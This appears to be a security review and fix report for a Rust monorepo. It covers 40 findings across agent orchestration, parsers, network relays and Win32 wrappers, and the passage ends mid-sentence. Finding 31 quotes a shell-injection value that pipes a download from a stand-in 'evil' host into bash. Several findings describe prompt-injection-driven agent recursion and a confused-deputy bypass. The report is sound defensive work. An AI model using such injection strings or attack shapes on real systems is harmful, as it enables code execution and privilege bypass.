# Monorepo improvement review — rusty_mill (round 3)

Reviewed on 2026-09-12 against this checkout, via `/codex-build`. This is a
third, independent pass — it does not reopen `CODEX-MONOREPO-REVIEW.md`'s
(round 1, 2026-09-11, 33 findings) or `CODEX-MONOREPO-REVIEW-2026-09-12.md`'s
(round 2, 63 findings) territory; both were fully fixed with regression
tests before this round started. It also does not reopen
`repo-inspector-report.md`'s duplication-cluster/sovereignty findings, a
different concern already triaged there.

All 40 findings below were fixed in the same working session that produced
this report, each with a regression test that fails on the pre-fix code and
passes post-fix — see **Disposition** below for the one-line outcome of
each.

## Method and scope

Round 2 explicitly named its own follow-up surface: the `nexus` microkernel's
`nexus-ai`/`nexus-ai-runtime`/`nexus-agent` LLM-orchestration layer,
`rusty_provider`'s `cli`/`core`/`server` crates beyond `router`, and the full
`rusty_tailscale` `ts-derp`/`ts-stun`/`ts-disco` wire codecs. This round
covers those three plus eleven more crate families neither round 1 nor round
2 touched at all: `nexus-kernel`/`nexus-collab`/`nexus-mcp` (a genuine
second look, not a re-audit — round 2's own text claimed these were
"reviewed... and found nothing," re-verified rather than trusted); the
standalone `rusty_mcp`/`rusty_croc`/`rusty_wiremock`/`rusty_homelab_mcp`;
`rusty_fedora`/`rusty_fedora_agent`'s client library; `rusty_codec`
(hand-rolled TOML/bincode) and `rusty_ansder` (hand-rolled DER/ASN.1);
`rusty_font`/`rusty_gui`/`rusty_gpu`/`rusty_vulkan`; `rusty_voice`/
`rusty_whisper`/`rusty_llama`; `rusty_multimodal_db`/`rusty_rusqlite`;
`rusty_inventrory`/`rusty_skillopt`; `rusty_lines`/`rusty_text`/
`rusty_hister`/`rpath`/`mill-term`; `rusty_boot`/`rusty_std`/`rusty_win32`/
`rusty_err`. It also investigated round 2's own closing disclosure of four
"pre-existing Windows path-separator bugs in `nexus-storage`" left unfixed —
ground-truthed by actually running the test suite on this Windows
workstation rather than taking the prior claim at face value.

Fourteen parallel read-only scout passes covered this surface; each was
instructed to report only concrete, triggerable defects with file:line
evidence and a specific triggering input, at high confidence, and to return
nothing rather than pad with style nits — `rusty_mcp` (standalone),
`rusty_wiremock`, `ts-stun`, `ts-disco`, `ts-filter`, `ts-key`,
`nexus-kernel::event_bus`, `nexus-collab`, `rusty_gui`, `rusty_gpu`,
`rusty_vulkan`, `rusty_voice`, `rusty_multimodal_db`'s durable-storage
stack, `rusty_err`, `rusty_boot`, and most of `rusty_inventrory`/
`rusty_skillopt` were reviewed in comparable depth and yielded nothing
meeting that bar, so they are not restated below as empty rows.

All locations are relative to this checkout at the time of review. Evidence
is from static inspection; example inputs and failure sequences are
proposed regression cases derived from that code. Severity: **high** =
memory unsafety, durable data loss, credential exposure, hostile-input
resource exhaustion, or a panic/hang/bypass reachable from untrusted/public
input; **medium** = bounded correctness/reliability defect or a security
gap with mitigating preconditions; **low** = documentation/config drift or
a small avoidable issue.

## Disposition

Every finding was fixed in this session by 20 parallel fix tasks (one per
crate group, to avoid edit collisions), each with a regression test that
fails pre-fix and passes post-fix, verified with `cargo test -p <crate>`
(not a full workspace build, to avoid 20-way build contention — each
task's own package-scoped verification is cited per finding below).

| # | Disposition | # | Disposition | # | Disposition | # | Disposition |
| - | - | - | - | - | - | - | - |
| 1 | fixed | 11 | fixed | 21 | fixed | 31 | fixed |
| 2 | fixed | 12 | fixed | 22 | fixed | 32 | fixed |
| 3 | fixed | 13 | fixed | 23 | fixed | 33 | fixed |
| 4 | fixed | 14 | fixed | 24 | fixed | 34 | fixed |
| 5 | fixed | 15 | fixed | 25 | fixed | 35 | fixed |
| 6 | fixed | 16 | fixed | 26 | fixed | 36 | fixed |
| 7 | fixed | 17 | fixed | 27 | fixed | 37 | fixed |
| 8 | fixed, partial (see note) | 18 | fixed | 28 | fixed | 38 | fixed (hardened) |
| 9 | fixed | 19 | fixed | 29 | fixed | 39 | fixed |
| 10 | fixed | 20 | fixed | 30 | fixed | 40 | fixed |

Notes on non-mechanical dispositions:
- **8** (nexus-mcp dynamic-tool confused deputy): the recommendation had two
  parts. Part 2 (reject registrations targeting a cap-matrix `internal =
  true` handler) is fully fixed, both at registration time and again
  defense-in-depth at invocation time. Part 1 (verify the registering
  caller's own plugin_id matches the `plugin_id` field it's registering)
  is **not implementable inside `nexus-mcp`** — traced through
  `nexus_plugins::CorePlugin::dispatch`/`IpcDispatcher::dispatch`/
  `KernelPluginContext::ipc_call_inner`, no caller identity is threaded to
  a handler at any hop in the dispatch chain today; this is an documented,
  pre-existing architectural gap (`docs/0.1.2/roadmap/DOC-GAPS.md:1621-1625`
  and a near-identical admission in `nexus-ai-runtime/src/core_plugin.rs:
  1207-1210`), not something this pass overlooked. Closing it for real
  requires extending `nexus-plugins`' and `nexus-kernel`'s trait signatures
  to thread caller plugin_id + trust level down to every handler (e.g. via
  a `tokio::task_local!`, matching this codebase's own established pattern
  for `IPC_CANCEL`) — out of `nexus-mcp`'s crate boundary and a separate,
  larger follow-up. The fix that *did* land (part 2, unconditional denial
  of internal-only targets) closes the more severe half of the
  vulnerability: a Community-trust plugin can no longer route a
  Core-trust-only handler through the MCP tool surface at all, regardless
  of what `plugin_id` it claims.
- **38** (`rusty_std::net`/`time` silent stubs): the finding's own
  recommendation offered a doc-comment-only minimum bar or a full real
  implementation, "using your judgment." The fixing agent chose the
  stronger option — wired both to real OS primitives (`rusty_libc` on
  Linux, `rusty_win32` on Windows), matching the crate's own established
  pattern for `fs::File`, rather than just disclosing the fake-success
  behavior in a doc comment.
- One fix task (`FixRustyWin32`, findings 36-37) technically reported
  `status: "failed"` due to a harness-level "yielded with null data"
  error on its final turn — its own transcript shows the actual work
  (both findings fixed, ~40 call sites mechanically updated for the new
  fallible `to_wide` signature, regression tests added) completed and
  self-verified (265 passed, 6 pre-existing/unrelated failures) one turn
  earlier. Independently re-verified after the fact by running `cargo test
  -p rusty_win32 --lib -- --test-threads=1` directly: **265 passed, 6
  failed** — all 6 failures are `net::tests::*` port-binding collisions
  (`Win32Error(10048)`, WSAEADDRINUSE) against a fixed `TEST_PORT` in
  `rusty_win32/src/net.rs`, a file neither this finding nor this fix task
  touched; confirmed pre-existing and environment-specific (concurrent
  test-run port contention on this workstation), not caused by this
  round's changes.

---

## `nexus-ai-runtime` / `nexus-agent` / `nexus-ai`

**1. AI-runtime admission control is documented but fully inert — unbounded concurrent LLM sessions from one legitimate trigger config.**
Location: `crates/nexus/crates/nexus-ai-runtime/src/supervisor.rs:60-97,124-126` (`AdmissionConfig`, never consulted), `src/core_plugin.rs:323-420` (`handle_submit`, unconditional spawn), `src/event_input.rs:160-165` (`TriggerFilter::All`), `src/core_plugin.rs:915-997` (`trigger_watcher_loop`).
Trigger: registering one `AmbientTrigger{filter: TriggerFilter::All}` — an explicitly sanctioned config — spawns a new billed LLM session per bus event with zero concurrency cap, despite `AdmissionConfig`'s documented per-`SessionKind` limits.
Fix: added an `AdmissionTracker` (atomic per-kind counters) that `handle_submit` acquires/checks before spawning, rejecting once `admission.limit_for(kind)` is reached; the slot releases as soon as the session actually stops running.
Regression test: `core_plugin::tests::submit_rejects_once_admission_limit_for_kind_is_reached`. Verified: `cargo test -p nexus-ai-runtime` — 86 passed.
Severity: high.

**2. `delegate_to_agent`'s default (shared-forge) path has no recursion-depth limit and no concurrency guard.**
Location: `crates/nexus/crates/nexus-agent/src/handlers/delegate.rs:107-109,146-200` (`delegate_shared`), `src/subagent.rs:313-332` (`acquire_subagent_slot`, only used by the isolated path).
Trigger: a session (via its own reasoning or a prompt-injected tool result) recursively calls `delegate_to_agent` with `auto_approve: true` (the default) and no depth tracking anywhere.
Fix: added a `delegation_depth: u32` field (never model-settable) threaded through `DelegateArgs` → `SessionRunArgs` → `KernelToolBridge`, which stamps the true depth onto every outgoing delegate call regardless of model-supplied args, rejecting past `MAX_DELEGATION_DEPTH = 5`; `delegate_shared` now also acquires the same subagent-slot semaphore `delegate_isolated` uses.
Regression test: `handlers::delegate::tests::delegate_shared_rejects_past_max_depth`, `delegate_shared_admits_one_below_max_depth`. Verified: `cargo test -p nexus-agent` — 247 passed, 2 pre-existing ignored (external-process tests, sandbox-forbidden).
Severity: high.

**3. MCP bridge tool-name truncation has no collision handling — cross-server tool-call misrouting.**
Location: `crates/nexus/crates/nexus-ai/src/tools/mcp_bridge.rs:229-248` (`mcp_tool_name`), `src/tools/registry.rs:126-133` (silent overwrite on collision).
Trigger: two distinct (server, tool) pairs whose `mcp__<server>__<tool>` strings share an identical 64-char prefix truncate to the same registry key; the model believes it's calling one server's tool but the executor silently shadows it.
Fix: when truncation is needed, reserve trailing bytes for a deterministic 8-hex-char disambiguator hashed from the untruncated pair, keeping the total at 64 chars.
Regression test: `tools::mcp_bridge::tests::mcp_tool_name_disambiguates_shared_64_char_prefix`. Verified: `cargo test -p nexus-ai` — 305 passed.
Severity: medium.

## `rusty_provider` (`rp-server`, `rp-core`)

**4. Unauthenticated JWKS-fetch amplification via unrecognized `kid` — no negative caching, no HTTP timeout.**
Location: `crates/rusty_provider/crates/server/src/jwt.rs:150-177` (`jwks_key`), `:180-192` (`fetch_jwks`), `:99` (untimed `reqwest::Client::new()`).
Trigger: a syntactically-valid but unsigned JWT with a random `kid` (no valid signature needed to reach `decode_header`) forces a fresh, pre-auth outbound HTTP call to the operator's JWKS endpoint on every request with a distinct `kid` — a pre-auth DoS/amplification primitive against the server itself or its JWKS provider.
Fix: added a per-`kid` negative cache (only refetches once per `cache_ttl` for a given unknown kid) and explicit request/connect timeouts on the JWKS `reqwest::Client`.
Regression test: `jwt::tests::jwks_key_negative_caches_an_unknown_kid_instead_of_refetching_every_time` (mock-server-backed, `.expect(1)`). Verified: `cargo test -p rp-server` — 56 lib + 86 integration passed.
Severity: high.

**5. Inbound rate limiter's per-key bucket map has no eviction — unbounded memory growth from IP churn.**
Location: `crates/rusty_provider/crates/core/src/rate_limit.rs:100-102` (`RateLimiter::buckets`), `:114-124` (`check`, insert-only).
Trigger: an attacker rotating source IPs (trivial via an IPv6 `/64`) permanently grows the bucket `HashMap` by one entry per distinct address forever, eventually OOM-killing the process.
Fix: added a fixed-capacity FIFO eviction policy (`MAX_BUCKETS = 100_000`), matching this crate family's existing bounded-cache convention (`GenerationCache`/`ResponseCache`).
Regression test: `rate_limit::tests::buckets_are_bounded_and_evict_oldest_first`. Verified: `cargo test -p rp-core` — 54 passed.
Severity: high.

## `rusty_tailscale` (`ts-derp`)

**6. `DerpClient::connect` has no timeout — a non-responsive or hostile DERP relay hangs the caller forever.**
Location: `crates/rusty_tailscale/crates/ts-derp/src/client.rs:114-127` (`connect`), `:157-197` (`handshake_over`).
Trigger: a relay that accepts the TCP connection but sends nothing hangs `Engine::start` (and therefore all of `ts-daemon`/`ts-net` startup) indefinitely.
Fix: wrapped TCP connect + the full handshake sequence in a bounded `tokio::time::timeout` (10s), returning a new `DerpError::Timeout` variant, mirroring the pattern already used by `EngineHandle::ping`.
Regression test: `client::tests::connect_times_out_on_unresponsive_relay`. Verified: `cargo test -p ts-derp` — 9 unit + 1 fuzz-smoke + 2 interop passed.
Severity: high.

**7. DERP handshake silently discards a non-ServerInfo frame instead of requiring/validating it.**
Location: `crates/rusty_tailscale/crates/ts-derp/src/client.rs:184-197`.
Trigger: any frame (e.g. a legitimately-early `KeepAlive` or relayed packet) arriving before `ServerInfo` is dropped on the floor, and the handshake proceeds without ever validating the server's NaCl box.
Fix: bounded loop (`MAX_HANDSHAKE_FRAMES = 16`) that skips non-`ServerInfo` frames and hard-fails if `ServerInfo`'s box doesn't validate or never arrives.
Regression test: `client::tests::handshake_rejects_unvalidated_serverinfo_after_other_frames`. Verified: same run as finding 6.
Severity: medium.

## `nexus-mcp`

**8. Dynamic-tool registry lets any plugin route arbitrary internal IPC handlers through the MCP server's own Core-trust context — confused deputy / internal-gate bypass.**
Location: `crates/nexus/crates/nexus-mcp/src/core_plugin.rs:437-460` (`HANDLER_REGISTER_TOOL`), `src/server.rs:3787-3805` (`call_tool`, executes via the server's own all-caps `KernelPluginContext`, not the registrant's), `crates/nexus/crates/nexus-bootstrap/cap_matrix.toml:2274-2281` (`register_tool` marked `unrestricted`).
Trigger: a Community-trust (WASM-sandboxed) plugin registers a tool naming a Core-trust-only (`internal = true`) handler as its target; any MCP client can then invoke it, executing with the server's own maximal privilege — bypassing the plugin's own capability restrictions entirely.
Fix: new `internal_gate` module (cap-matrix-derived lookup) rejects registration of any `internal = true` target at registration time, with a second defense-in-depth check immediately before execution in `call_tool`. See Disposition note above for the one architecturally-blocked sub-item.
Regression test: `register_tool_rejects_internal_only_targets` (in `core_plugin.rs`'s test module). Verified: `cargo test -p nexus-mcp` — 103 passed.
Severity: high.

## `rusty_croc`

**9. Symlink-through-parent-directory bypasses receive-side path confinement — arbitrary file write anywhere the recipient can write.**
Location: `crates/rusty_croc/src/croc.rs:1876-1886` (`recipient_next_file`'s symlink fast path), `:2046-2056` (`make_symlink`, zero target validation), `:2058-2066` (`open_receive_file`'s guard, checks only the leaf path).
Trigger: a malicious sender's file list creates a symlink (e.g. `symlink: "../evil"` or an absolute path) via one entry, then a second entry's `folder_remote` references it — the classic tar/zip-slip pattern, defeating even the existing `.ssh`-substring blocklist since the folder name in step 2 need not mention `.ssh`.
Fix: `validate_symlink_target()` rejects absolute/`..`-containing symlink targets before creation; `ancestor_escapes_root()` re-canonicalizes `dest`'s ancestor chain against the receive root before every regular-file open, catching an ancestor-component symlink planted earlier in the same batch.
Regression test: `croc::tests::symlink_target_validation_rejects_escape`, `ancestor_escape_detects_symlinked_directory` (the latter's Unix half independently verified on real Linux via WSL, since this Windows workstation can't create symlinks unprivileged). Verified: `cargo test -p rusty-croc --lib` — 52 passed.
Severity: high.

**10. Self-hosted relay: unbounded thread-per-connection plus a 3-hour pre-auth idle timeout — trivial connection-exhaustion DoS.**
Location: `crates/rusty_croc/src/tcp.rs:134-155` (`RelayServer::run`), `src/comm.rs:36-37,49-52` (`IDLE_READ_TIMEOUT`, applied before authentication).
Fix: added a configurable connection cap (`DEFAULT_MAX_CONNECTIONS = 1024`) with an atomic counter; connections beyond the cap are closed immediately instead of spawned.
Regression test: `tcp::tests::max_connections_sheds_excess` (verified to genuinely detect the gap by temporarily disabling the fix and confirming the test then fails on a real Windows connection timeout, not a vacuous pass). Verified: same run as finding 9.
Severity: medium.

## `rusty_homelab_mcp`

**11. HTTP transport has no way to enable bearer-token authorization for a server that can power off VMs, delete firewall rules, and write host config.**
Location: `crates/rusty_homelab_mcp/src/main.rs:64-79`, `src/config.rs` (`HomelabCli`, no auth flag existed).
Fix: added `--auth-token`/`HOMELAB_MCP_AUTH_TOKEN` and `--auth-resource-url` flags building a `rusty_mcp::auth::StaticTokenValidator`-backed `AuthConfig`, wired into `HttpConfig::auth` when the HTTP transport is selected.
Regression test: `config::tests::an_auth_token_flag_enables_bearer_authorization_on_http_config` plus two companions (resource-url override, backward-compatible no-flag default). Verified: `cargo test -p rusty_homelab_mcp` — 48 passed.
Severity: medium.

## `rusty_fedora_agent`

**12. Unbounded HTTP request body read — single-request memory exhaustion.**
Location: `crates/rusty_fedora_agent/src/http.rs:74-76`.
Fix: 1 MiB cap enforced both via `Content-Length` pre-check and a `Read::take` ceiling on the actual read, returning a 413-equivalent error.
Regression test: `read_body_rejects_a_content_length_over_the_cap_without_reading_it`. Verified on Linux via WSL (this crate is `#![cfg(target_os = "linux")]`-only, confirmed pre-existing and unrelated to this fix on native Windows): `cargo test -p rusty_fedora_agent` — 50 passed.
Severity: high.

**13. In-memory dnf task registry grows without bound for the life of the process.**
Location: `crates/rusty_fedora_agent/src/dnf.rs:21,65,103`.
Fix: bounded FIFO eviction (`MAX_COMPLETED_TASKS = 50`, oldest-completed-first).
Regression test: `completed_tasks_beyond_the_cap_are_evicted_oldest_first`. Verified: same WSL run as finding 12.
Severity: medium.

## `rusty_codec` (`rusty_toml`, `rusty_bincode`) / `rusty_ansder`

**14. Unbounded mutual recursion in the TOML value parser — stack-overflow crash on nested arrays/inline tables.**
Location: `crates/rusty_codec/src/toml.rs:284-289,387-404` (`parse_value`/`parse_array`/`parse_inline_table`).
Fix: depth counter capped at 64 (matching `rusty_regx`'s established pattern), erroring past the cap.
Regression test: `toml::tests::deeply_nested_arrays_are_rejected_instead_of_overflowing_the_stack`. Verified: `cargo test -p rusty_codec -p rusty_ansder` — 19 + 4 passed.
Severity: high.

**15. `rusty_bincode::deserialize` integer-overflow panic on a crafted length header.**
Location: `crates/rusty_codec/src/binary.rs:21-26`.
Fix: `checked_add` for the length-plus-header offset, `bytes.get()` instead of a direct slice.
Regression test: `binary::tests::deserialize_rejects_a_length_header_past_the_end_of_the_buffer_instead_of_panicking`. Verified: same run as finding 14.
Severity: medium.

**16. `rusty_bincode::serialize` silently truncates/corrupts payloads ≥ 4 GiB.**
Location: `crates/rusty_codec/src/binary.rs:7-11`.
Fix: widened to a fallible `Result`-returning signature, validating `data.len() <= u32::MAX`; updated the one call site (`rusty_boot`).
Regression test: `binary::tests::serialize_returns_a_result_and_still_roundtrips_normal_sized_data`. Verified: same run as finding 14, plus `cargo check -p rusty_boot`.
Severity: medium.

**17. `read_integer_u32` accepts negative DER INTEGER encodings and silently reinterprets them as large unsigned values.**
Location: `crates/rusty_ansder/src/der.rs:156-169`.
Fix: rejects a set sign bit (and non-canonical leading-zero padding) before accumulating.
Regression test: `der::tests::read_integer_u32_rejects_a_negative_der_encoding`. Verified: same run as finding 14.
Severity: medium.

## `rusty_font`

**18. Exponential-blowup DoS via nested TrueType composite glyphs — depth is capped, per-level branching is not.**
Location: `crates/rusty_font/src/ttf.rs:350,378-513` (`MAX_COMPOSITE_DEPTH` bounds depth only; no memoization).
Fix: memoized glyph-id resolution within one top-level `glyph_outline` call.
Regression test: `composite_glyph_resolution_is_memoized_by_glyph_id`. Verified: `cargo test -p rusty_font` — 28 passed.
Severity: high.

**19. `cmap` format-12 subtable allocates a `Vec` sized by an untrusted 32-bit group count before validating it.**
Location: `crates/rusty_font/src/ttf.rs:573-574`.
Fix: validate `num_groups` against the subtable's actual remaining length before `Vec::with_capacity`.
Regression test: `cmap_format_12_rejects_a_group_count_that_does_not_fit_the_subtable`. Verified: same run as finding 18.
Severity: high.

**20. Non-monotonic `glyf` contour-end offsets cause a slice-index panic in the rasterizer.**
Location: `crates/rusty_font/src/ttf.rs:625-636`, `src/rasterizer.rs:122-137`.
Fix: `parse_simple_glyph` now rejects a non-strictly-increasing `contour_ends`.
Regression test: `simple_glyph_rejects_non_monotonic_contour_ends`. Verified: same run as finding 18.
Severity: high.

## `rusty_whisper` / `rusty_llama`

**21. GGUF `general.alignment = 0` causes an unconditional division-by-zero panic.**
Location: `crates/rusty_whisper/src/gguf.rs:172,178-179,246`.
Fix: clamp alignment to `.max(1)`, mirroring `rusty_llama::gguf`'s existing guard.
Regression test: `gguf::tests::zero_alignment_does_not_panic`. Verified: `cargo test -p rusty-whisper --features gguf` — 212 passed.
Severity: high.

**22. GGUF tensor-shape element-count product has no overflow guard.**
Location: `crates/rusty_whisper/src/gguf.rs:256-270`.
Fix: ported `rusty_llama::gguf`'s `checked_mul`-based dims-overflow rejection; `checked_add`/`checked_mul` for offset/size arithmetic.
Regression test: `gguf::tests::tensor_dims_overflow_is_rejected`. Verified: same run as finding 21.
Severity: high.

**23. Legacy `.bin` loader indexes a fixed 3-element `dims` array with an unclamped file-controlled `n_dims`.**
Location: `crates/rusty_whisper/src/model.rs:157-176`.
Fix: reject `n_dims > 3` before slicing.
Regression test: `model::tests::rejects_tensor_with_too_many_dims`. Verified: `cargo test -p rusty-whisper` — 208 passed.
Severity: high.

**24. Legacy `.bin` loader sizes every buffer allocation directly from unchecked, sign-extended header integers.**
Location: `crates/rusty_whisper/src/model.rs` (multiple sites: `read_f32_vec`, mel filterbank, vocab, tensor name/data).
Fix: added a `check_len`/`MAX_LEN = 1<<28` ceiling applied before every allocation, mirroring `rusty_llama::gguf`'s existing caps.
Regression test: `model::tests::rejects_sign_extended_negative_tensor_name_len`. Verified: same run as finding 23.
Severity: high.

**25. Malformed WAV `fmt ` chunk causes an out-of-bounds slice panic, reachable from `whisper-server`'s public upload endpoint.**
Location: `crates/rusty_whisper/src/wav.rs:45-50,132-137`.
Fix: validate `fmt.len() >= 16` before indexing, in both `WavStream::new` and `read_wav`.
Regression test: `wav::tests::rejects_undersized_fmt_chunk`. Verified: same run as finding 23.
Severity: high.

**26. Unbounded recursion in the GBNF grammar parser — reachable from an untrusted request body's `grammar` field.**
Location: `crates/rusty_llama/src/grammar.rs:432-448`.
Fix: depth counter capped at 64, mirroring `rusty_jinja`'s fix for the identical bug class.
Regression test: `grammar::tests::deeply_nested_groups_error_instead_of_overflowing_stack`. Verified: `cargo test -p rusty_llama` — 171+11 lib/grammar tests, 22+9+3+2 integration tests, all passed.
Severity: high.

## `rusty_rusqlite`

**27. LIKE/GLOB matcher allocates an unbounded O(n·m) DP table from attacker-controlled text/pattern lengths.**
Location: `crates/rusty_rusqlite/src/like.rs:150-165`.
Fix: `checked_mul`-guarded cell-count cap (`MAX_DP_CELLS = 4,000,000`) before allocating; oversized inputs return "no match" rather than attempting the allocation.
Regression test: `like::tests::oversized_text_and_pattern_bail_out_instead_of_huge_allocation` (asserts sub-second completion). Verified: `cargo test -p rusty_rusqlite` — 638 passed.
Severity: high.

**28. `deserialize()` preallocates memory from untrusted length prefixes before validating bytes exist.**
Location: `crates/rusty_rusqlite/src/serialize.rs:213-241`.
Fix: replaced `Vec::with_capacity(untrusted_count)` with incremental `push`, bounded by what's actually present in the byte stream (each element read fails fast on truncation).
Regression test: `serialize::tests::deserialize_rejects_a_huge_untrusted_count_without_preallocating`. Verified: same run as finding 27.
Severity: high.

**29. `generate_series` virtual table cursor overflows on unchecked `current += step`.**
Location: `crates/rusty_rusqlite/src/vtab_series.rs:99-101`.
Fix: `checked_add`; overflow now terminates the cursor (EOF) instead of wrapping/panicking/looping forever.
Regression test: `vtab_series::tests::series_next_overflow_terminates_instead_of_panicking`. Verified: same run as finding 27.
Severity: medium.

**30. `SUM` aggregate has no integer-overflow handling.**
Location: `crates/rusty_rusqlite/src/aggregate.rs:83-96`.
Fix: `checked_add`, promoting to `Value::Real` on overflow (matching real SQLite's SUM semantics) instead of silently wrapping.
Regression test: `aggregate::tests::sum_promotes_to_real_on_integer_overflow_instead_of_wrapping`. Verified: same run as finding 27.
Severity: medium.

## `rusty_inventrory` / `rusty_skillopt`

**31. `inv resume` prints an unescaped, copy/paste-able shell command built from untrusted session data.**
Location: `crates/rusty_inventrory/crates/inventory-core/src/handoff.rs:33-45`.
Trigger: an `external_id` sourced from an untrusted tool-written JSONL session file (e.g. `x" && curl evil | bash && echo "`) breaks out of the previous bare-double-quote-only-on-space quoting when copy/pasted, as the tool's own UX invites.
Fix: `display()` now applies unconditional POSIX single-quote shell-quoting (`'` → `'\''`) to every argument.
Regression test: `handoff::tests::display_round_trips_through_posix_shell_word_splitting` (round-trips through a POSIX word-splitting simulation), `display_escapes_embedded_single_quotes`. Verified: `cargo test -p inventory-core` — 81 passed (one pre-existing integration test assertion updated to the new, safe quoted format).
Severity: medium.

**32. Predictable, non-atomic temp file/dir names in skillopt-model's subprocess backends — local symlink attack.**
Location: `crates/rusty_skillopt/crates/skillopt-model/src/claude_cli.rs:21-29`, `src/aisf_stage.rs:55-61`.
Fix: replaced manual `std::env::temp_dir().join(pid+counter)` + `std::fs::write`/`create_dir_all` with `tempfile::Builder`'s atomic, race-free creation (already this workspace's established pattern, per `rusty_inventrory`'s `snapshot.rs`).
Regression test: `scratch_system_prompt_file_path_is_not_predictable_from_pid_and_counter` (x2, one per call site). Verified: `cargo test -p skillopt-model` — 21+2+2 passed.
Severity: medium.

## `rusty_lines` / `rusty_text` / `rpath`

**33. `word_back()` off-by-one on multi-byte Unicode whitespace panics the default Ctrl-W binding.**
Location: `crates/rusty_lines/src/lib.rs:3466-3472`.
Trigger: typing `a<NBSP>b` then pressing Ctrl-W (the default `UnixWordRubout` binding) panics on a non-char-boundary slice — ordinary, non-adversarial input in any host embedding this editor (e.g. `rush`).
Fix: use the crate's existing `next_char_end` boundary-safe helper instead of raw `i + 1`.
Regression tests: `word_back_multibyte_whitespace_char_boundary`, `unix_word_rubout_multibyte_whitespace_no_panic`. Verified: `cargo test -p rusty_lines` — 88 unit + 5 integration + 1 doctest passed.
Severity: high.

**34. Awk expression parser has unbounded recursion depth — reachable from the `rawk` CLI.**
Location: `crates/rusty_text/src/awk/parser.rs` (three recursive sites: `parse_primary`'s `(`, `parse_unary`'s `!`/unary-minus, `parse_stmt`'s block nesting).
Fix: depth counter capped at 64, mirroring `rusty_jinja`'s fix for the identical bug class.
Regression tests: four, covering all three recursive sites plus the public `AwkProgram::parse` entry point. Verified: `cargo test -p rusty_text` — 48 passed.
Severity: high.

**35. `rpath::normalize_path` drops the Windows drive letter (or lets `..` escape a backslash-rooted path) when `..` segments outnumber remaining components.**
Location: `crates/rpath/src/lib.rs:123-154`.
Fix: drive/root prefix now kept outside the mutable segment stack (can never be popped); root-clamp check extended to cover a bare-backslash root with no drive letter.
Regression test: `test_normalize_path_clamps_excess_dotdot_at_root` (both the drive-letter-preservation and backslash-root-clamp cases). Verified: `cargo test -p rpath` — 5 passed.
Severity: medium.

## `rusty_win32` / `rusty_std`

**36. `wide::to_wide` silently truncates every string at an embedded NUL instead of rejecting it — used by essentially every `*W` Win32 API wrapper in the crate.**
Location: `crates/rusty_win32/src/wide.rs:9-11`.
Trigger: a caller that validates a filename/registry-key/service-name as a full `&str` before calling this crate sees a different, attacker-chosen path/key than the Win32 API actually operates on once an embedded NUL truncates it early — a straightforward validation-bypass shape.
Fix: `to_wide` now returns `Result<Vec<u16>, Win32Error>`, rejecting any embedded `'\0'`; ~40 call sites across every module (fs, registry, credential, dynlib, service, security, path, process, job, volume, watch, console, certstore) mechanically updated to propagate the new fallibility. Incidentally uncovered and fixed a latent, related bug in `security::sd_to_string` (trusted a padded length instead of scanning for the real NUL terminator).
Regression test: `wide::tests::to_wide_rejects_an_embedded_nul_instead_of_truncating` + a happy-path sibling.
Severity: high.

**37. `fs::readlink` slices its result buffer using unvalidated offset/length fields from untrusted reparse-point data.**
Location: `crates/rusty_win32/src/fs.rs:839-842`.
Fix: extracted `parse_symlink_print_name`, bounds-checks `print_name_offset`/`print_name_length` against the actual returned byte count before slicing.
Regression test: `parse_symlink_print_name_rejects_an_out_of_bounds_offset_instead_of_panicking` + an in-bounds sanity test.
Verification (findings 36-37 combined): `cargo test -p rusty_win32 --lib -- --test-threads=1` — **265 passed, 6 failed**, independently re-run and confirmed by this session directly (not just the fixing task's own report); all 6 failures are pre-existing `net::tests::*` fixed-port collisions (`Win32Error(10048)`) in the untouched `net.rs`, unrelated to either finding — see Disposition note.
Severity: high.

**38. `net::TcpStream`/`time::Instant` are silent no-op stubs that report false success/measurements with no disclosure.**
Location: `crates/rusty_std/src/net.rs:16-45`, `src/time.rs:29-40`.
Fix: wired both to real OS primitives (`rusty_libc` on Linux, `rusty_win32`/Winsock on Windows), matching the crate's existing `fs::File` pattern, rather than only adding a disclosure comment — going beyond the finding's minimum-bar recommendation. Any still-unsupported target (e.g. wasm32) retains the old stub behavior, now explicitly documented.
Regression tests: `time::tests::elapsed_reflects_real_wall_clock_time` (sleeps 20ms, asserts real elapsed time), `net::tests::write_then_read_round_trips_over_a_real_loopback_socket`, `net::tests::connect_to_a_closed_port_fails`. Verified: `cargo test -p rusty_std` — 6 passed.
Severity: medium.

## `nexus-storage` (round 2's own disclosed follow-up)

**39-40. `import.rs`'s two relpath-construction sites are missing the `\`→`/` normalization every sibling module in this crate already applies, causing two tests to fail on Windows.**
Location: `crates/nexus/crates/nexus-storage/src/import.rs:166-174` (`walk_for_import`), `:307-320` (`next_rename_target`).
Ground truth: round 2's closing note claimed "four pre-existing Windows path-separator bugs" spread across `ast_query.rs`/`find_replace.rs`/`import.rs`. Actually running `cargo test -p nexus-storage --lib` on this Windows workstation found that claim did not hold: `ast_query.rs` and `find_replace.rs` already normalize correctly and every one of their tests passes; only `import.rs`'s two call sites were missing the pattern, causing exactly 2 failing tests (`apply_copies_new_files`, `apply_rename_strategy_writes_imported_suffix`).
Fix: added the same `.replace('\\', "/")` normalization already used by `reconcile.rs`/`find_replace.rs`/`ast_query.rs`, at both sites.
Regression test: the two pre-existing failing tests now serve as the regression tests. Verified: `cargo test -p nexus-storage --lib import::` — 7 passed; full suite `cargo test -p nexus-storage --lib` — **502 passed, 0 failed** (up from round 2's 500 passed/2 failed).
Severity: low (string-only mismatch visible to API consumers; on-disk file operations were unaffected since `Path::join` already tolerates the embedded backslash on Windows).

---

## Delivery notes

All 40 findings above were fixed in this session by 20 parallel fix tasks,
one per disjoint crate group, each adding a regression test in that crate's
existing test conventions and verifying with a package-scoped `cargo test
-p <crate>` (not a full workspace build — avoided intentionally to prevent
20-way build/target-directory contention across concurrent tasks). Every
task's cited pass/fail counts were taken from its own tool-recorded
command output; `rusty_win32` (findings 36-37) was additionally
independently re-run and confirmed directly by this session after its
fixing task reported a harness-level yield error (see Disposition).

Two crates required environment-specific verification: `rusty_fedora_agent`
(findings 12-13) is `#![cfg(target_os = "linux")]`-only and was verified via
WSL rather than natively on this Windows workstation, consistent with this
crate's own documented CI exclusion. `rusty_croc`'s symlink-escape fix
(finding 9) was additionally verified against real Linux symlink semantics
via WSL, since this Windows workstation cannot create symlinks without
elevation.

No workspace-wide `cargo check --workspace`/`cargo test --workspace`,
clippy, or rustfmt was run — each fix task was scoped to `cargo test -p
<its own crate(s)>` only, both to keep 20 concurrent edits from colliding
on a shared build and because the full workspace (>300 members) makes a
from-scratch full-workspace build impractical within one session. No
commits, pushes, or PRs were made; all changes are unstaged working-tree
